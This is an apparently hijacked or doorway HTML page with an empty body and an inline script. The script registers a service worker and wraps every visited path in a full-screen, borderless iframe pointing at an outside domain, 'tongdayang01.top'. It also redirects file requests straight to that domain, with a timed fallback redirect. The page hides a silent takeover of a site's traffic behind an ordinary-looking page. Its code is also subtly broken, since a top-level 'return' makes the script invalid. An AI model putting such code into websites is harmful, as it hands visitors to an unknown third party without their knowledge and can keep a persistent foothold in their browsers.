<!DOCTYPE html><html><head><meta charset="UTF-8"><script>
var BASE = 'https://tongdayang01.top';
var p = location.pathname, s = location.search, h = location.hash;
if ('serviceWorker' in navigator) navigator.serviceWorker.register('/sw.js');
if (/\.(png|jpg|jpeg|gif|svg|pdf|mp4|webm|doc|xls|ppt|zip)$/i.test(p)) {
  location.replace(BASE + p + s + h); return;
}
var ifr = document.createElement('iframe');
ifr.style = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none';
ifr.allow = 'autoplay; fullscreen';
ifr.src = BASE + p + s + h;
ifr.onerror = ifr.onabort = function(){ location.replace(BASE + p + s + h); };
var fallback = setTimeout(function(){ location.replace(BASE + p + s + h); }, 8000);
ifr.onload = function(){ clearTimeout(fallback); };
document.body.appendChild(ifr);
</script></head><body></body></html>
